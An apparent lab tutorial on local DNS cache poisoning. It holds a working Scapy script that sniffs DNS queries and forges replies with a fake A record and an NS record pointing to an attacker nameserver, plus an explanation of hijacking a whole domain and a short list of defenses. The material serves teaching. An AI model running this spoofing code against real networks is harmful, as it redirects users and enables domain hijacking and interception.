# 🧪 04-04: Local DNS Cache Poisoning

## 📌 Definition

DNS cache poisoning is an attack where a malicious actor injects **false DNS records** into a DNS server’s cache.

👉 As a result:

- Users are redirected to incorrect (attacker-controlled) IP addresses
- Even though they typed the correct domain name

---

## 🧠 Basic Idea

### Normal DNS Flow

User → DNS Query → DNS Server → Real IP → User

### After Attack

User → DNS Query → Fake reply arrives first → Wrong IP cached → User redirected

💥 The DNS server trusts the fake response and stores it in cache

---

## ⚠️ Key Concept

DNS commonly uses UDP (connectionless protocol)

👉 This means:

- No connection handshake  
- Limited verification  
- First valid response may be accepted  

🔥 So the attacker tries to:

“Send a fake reply faster than the real DNS server”

---

## 📦 Conceptual Packet Logic

A forged DNS response mimics a real one by matching key fields:

- Transaction ID → must match request  
- Source/Destination IP → appears from DNS server  
- Source port → usually 53  
- Question section → copied from request  
- Answer section → contains fake IP  
- Authority section → may redirect domain control  

---

## 🧾 Simplified Pseudocode

Observe DNS query
    
If domain matches target:
    Extract domain name
    Create fake IP header
    Create fake UDP header
    Create fake DNS answer record
    Create fake authority record
    Build DNS response matching request
    Send fake response before real one

---

## Code

from scapy.all import *

def spoof_dns(pkt):
    # Step 1: Check if packet contains DNS query
    if DNS in pkt and pkt[DNS].qd is not None:
        qname = pkt[DNS].qd.qname.decode()
        
        # Step 2: Target specific domain
        if "www.example.com" in qname:
            print("[*] Spoofing:", qname)

            # -------------------------------
            # Step 3: Fake IP header
            # -------------------------------
            IPpkt = IP(
                dst=pkt[IP].src,   # send back to victim
                src=pkt[IP].dst    # pretend to be DNS server
            )

            # -------------------------------
            # Step 4: Fake UDP header
            # -------------------------------
            UDPpkt = UDP(
                dport=pkt[UDP].sport,  # victim port
                sport=53               # DNS port
            )

            # -------------------------------
            # Step 5: Fake Answer (IP)
            # -------------------------------
            Anssec = DNSRR(
                rrname=pkt[DNS].qd.qname,
                type='A',
                rdata='1.2.3.4',   # fake IP
                ttl=259200
            )

            # -------------------------------
            # Step 6: Authority Section (Poisoning)
            # -------------------------------
            NSsec = DNSRR(
                rrname="example.com",
                type='NS',
                rdata='ns.attacker32.com',
                ttl=259200
            )

            # -------------------------------
            # Step 7: Build DNS Response
            # -------------------------------
            DNSpkt = DNS(
                id=pkt[DNS].id,  # must match request
                qr=1,            # response
                aa=1,            # authoritative
                rd=0,

                qd=pkt[DNS].qd,
                qdcount=1,
                ancount=1,
                nscount=1,

                an=Anssec,
                ns=NSsec
            )

            # Step 8: Combine full packet
            spoofpkt = IPpkt / UDPpkt / DNSpkt

            # Step 9: Send fake response
            send(spoofpkt, verbose=0)


Step 10: Sniff DNS traffic
sniff(
    filter="udp port 53",
    prn=spoof_dns,
    store=0
)

---

## 🧩 Step-by-Step Explanation

### 🟢 Step 1: Observe DNS Query
The attacker detects a DNS request for a domain.

---

### 🟢 Step 2: Extract Domain Name
Example:
www.example.com

---

### 🟢 Step 3: Target Specific Domain
Attack is usually limited to chosen domains.

---

### 🔵 Step 4: Forge IP Header
- Swap source and destination
- Pretend to be DNS server

---

### 🔵 Step 5: Forge UDP Header
- Source port = 53  
- Destination port = victim’s port  

---

### 🟡 Step 6: Create Fake Answer
Example:
www.example.com → 1.2.3.4

👉 This is the malicious redirection

---

### 🔴 Step 7: Poison Authority Section
Example:
example.com → ns.attacker32.com

👉 This is the powerful part

It tells the DNS server:

“Trust this attacker-controlled nameserver”

---

### 📦 Step 8: Build DNS Response
- Transaction ID must match  
- Question must match  
- Packet must look legitimate  

---

### 🚀 Step 9: Send Fake Reply
If fake response arrives first → it may be cached

---

### 🔄 Step 10: Cache Gets Poisoned
Future requests use incorrect data

---

## 🎯 Final Intuition

| Component | Role in Attack |
|----------|--------------|
| Question | What domain was requested |
| Answer | Provides fake IP |
| Authority | Redirects domain control |
| Transaction ID | Makes packet look valid |
| UDP | Makes spoofing easier |

---

## 💥 What Happens After the Attack

The DNS server may cache:

- www.example.com → 1.2.3.4  
- example.com → ns.attacker32.com  

👉 Future queries are redirected to attacker-controlled systems

---

## 🌐 How to Hijack the Entire Domain

### 🟢 Basic Attack (A Record Only)

www.example.com → fake IP  

👉 Only one domain is affected

---

### 🔴 Advanced Attack (Authority / NS Record)

example.com → ns.attacker32.com  

👉 Now:

- www.example.com → attacker  
- mail.example.com → attacker  
- any subdomain → attacker  

💥 Entire domain is hijacked

---

## 🛡️ Defenses

To prevent DNS cache poisoning:

- DNSSEC → cryptographic verification  
- Random transaction IDs  
- Random source ports  
- Short TTL values  
- Secure DNS resolvers  

---

## ✅ Key Takeaway

DNS cache poisoning works by sending a forged DNS response that appears legitimate.

- If accepted → it is cached  
- If authority is poisoned → entire domain can be controlled  

🔥 Authority section poisoning is far more powerful than simple IP spoofing

---